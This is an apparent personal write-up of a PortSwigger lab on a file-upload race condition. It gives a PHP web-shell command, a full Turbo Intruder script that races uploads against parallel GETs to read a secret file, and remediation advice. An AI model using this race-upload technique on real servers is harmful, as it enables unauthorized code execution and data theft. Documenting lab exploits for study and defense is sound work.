---
title: "Web Shell Upload via Race Condition"
platform: "PortSwigger"
category: "Race Conditions"
difficulty: "Practitioner"
date: 2026-04-15
techniques: ["File Upload Race", "PHP Web Shell", "RCE"]
---

# Lab: Web Shell Upload via Race Condition

## Platform
PortSwigger Web Security Academy

## Category
Race Conditions / File Upload

## Difficulty
Practitioner

## Objective
Upload a PHP web shell by exploiting a race condition in the file validation process, then exfiltrate the contents of `/home/carlos/secret`.

---

## Context

The lab has an avatar upload function that performs server-side validation on uploaded files. The validation flow is vulnerable to a race condition: the server first saves the uploaded file to disk, then validates it (checking file type), and deletes it if invalid. During the window between the file being saved and being deleted, an attacker can access and execute the uploaded PHP file.

---

## Reconnaissance

### Credentials
- **Username:** wiener
- **Password:** peter

### Key Endpoints
| Endpoint | Method | Purpose |
|---|---|---|
| `/my-account/avatar` | POST | Upload avatar file |
| `/files/avatars/<filename>` | GET | Access uploaded avatar |
| `/my-account` | GET | Account page with upload form |

### Upload Validation Behavior
Uploading a `.php` file returns **403 Forbidden** with the message "Sorry, only JPG & PNG files are allowed." However, the server temporarily saves the file before validating and deleting it — creating a race window.

### Vulnerable Server Code
```php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];
// temporary move — FILE EXISTS ON DISK HERE
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file has been uploaded.";
} else {
    unlink($target_file);  // DELETE — but race window already passed
    echo "Sorry, there was an error uploading your file.";
}
```

The race window exists between `move_uploaded_file()` (file saved) and `unlink()` (file deleted).

---

## Exploitation

### Vulnerable Flow
```
POST /my-account/avatar (exploit.php):
  Step 1: move_uploaded_file() → FILE SAVED TO DISK  ←── RACE WINDOW
  Step 2: checkViruses() + checkFileType()                    ↑
  Step 3: unlink() → FILE DELETED                    GET /files/avatars/exploit.php
                                                     arrives here → PHP EXECUTES!
```

### Attack Steps

1. **Created PHP web shell** on Kali:
```bash
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > /tmp/exploit.php
```

2. **Uploaded exploit.php** as avatar via browser — received 403 "only JPG & PNG files are allowed" as expected

3. **Captured POST /my-account/avatar** in Burp HTTP History

4. **Sent to Turbo Intruder** — right-click → Extensions → Turbo Intruder → Send to Turbo Intruder

5. **Configured Turbo Intruder script** — 1 upload + 50 GET requests per attempt, 20 attempts:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    getReq = '''GET /files/avatars/exploit.php HTTP/2
Host: 0ac6003b038b9b7e82d1cf3b003a00ab.web-security-academy.net
Cookie: session=XxIGJEme1bBWLJ1CLIo3sYOqsc53vhVI

'''

    for attempt in range(20):
        engine.queue(target.req, gate=str(attempt))
        for i in range(50):
            engine.queue(getReq, gate=str(attempt))
        engine.openGate(str(attempt))

def handleResponse(req, interesting):
    if 'secret' in req.response or req.status == 200:
        table.add(req)
```

6. **Launched attack** — 20 attempts × 51 requests = 1,020 total requests

7. **Analyzed results** — multiple GET requests returned 200 with Content-Length 32, containing the secret

8. **Extracted secret:** `8Yn0bj3aISfGVTKF3yNa8o5QY7ndxF6v`

9. **Submitted solution** — lab solved

### Result
- **RCE achieved** via file upload race condition
- **Secret exfiltrated:** `8Yn0bj3aISfGVTKF3yNa8o5QY7ndxF6v`
- **Multiple successful hits** — the race window was wide enough for many GET requests to succeed

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | Exploitation for Client Execution | T1203 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Collection | Data from Local System | T1005 |

### CWE
- **CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- **CWE-434:** Unrestricted Upload of File with Dangerous Type

---

## Key Concepts Learned

| Concept | Description |
|---|---|
| File Upload Race Condition | Exploiting the window between file save and file validation/deletion |
| Upload-then-Validate Anti-Pattern | Server saves file before checking type — any file exists on disk temporarily |
| PHP Web Shell | Simple PHP script that executes server-side code: `<?php echo file_get_contents(...); ?>` |
| Parallel GET Flooding | Sending 50 GET requests per upload attempt maximizes the chance of hitting the race window |
| RCE via Race Condition | Combining file upload bypass with race condition achieves Remote Code Execution |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite Community | Proxy, HTTP History |
| Turbo Intruder | Parallel upload + GET requests with gate mechanism |
| Kali Linux terminal | Creating PHP web shell (`echo` command) |
| Firefox (Kali) | Browser with proxy, submitting the secret |

---

## Commands & Techniques Cheatsheet

```
# File Upload Race Condition Attack Flow

# 1. Create PHP web shell
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > /tmp/exploit.php

# 2. Upload via browser to capture the POST request
# 3. Send POST /my-account/avatar to Turbo Intruder
# 4. Script: queue 1 upload + 50 GETs per gate, 20 attempts
# 5. Look for 200 responses with small Content-Length (the secret)
# 6. Submit the secret string to solve the lab
```

---

## Remediation

To prevent file upload race conditions:

- **Validate before saving:** Check file type, extension, and content BEFORE writing to disk — never save then validate
- **Use temporary directory:** Upload to a non-web-accessible temp directory, validate there, then move to the public directory only if valid
- **Randomize filenames:** Generate random filenames on upload so attackers can't predict the URL to access during the race window
- **Atomic move:** Use a two-step process where the file is only accessible after validation completes (e.g., rename from `.tmp` to final extension)
- **Disable PHP execution in upload directory:** Configure the web server to never execute PHP files in the avatars directory (`php_flag engine off` in `.htaccess`)

---

## Reflection

This lab demonstrates how race conditions can escalate file upload restrictions into full Remote Code Execution. The server's "upload-then-validate" pattern is a common anti-pattern — it creates a window where any file type exists on disk and is accessible via the web server. The attack is straightforward once you understand the pattern: flood GET requests in parallel with the upload, and at least one will hit the file before deletion. In a real bug bounty context, this would be a Critical severity finding (RCE) and would likely pay maximum bounty. This lab also shows the intersection of race conditions with other vulnerability classes — the file upload restriction is robust when tested sequentially, but completely bypassed through concurrent access.
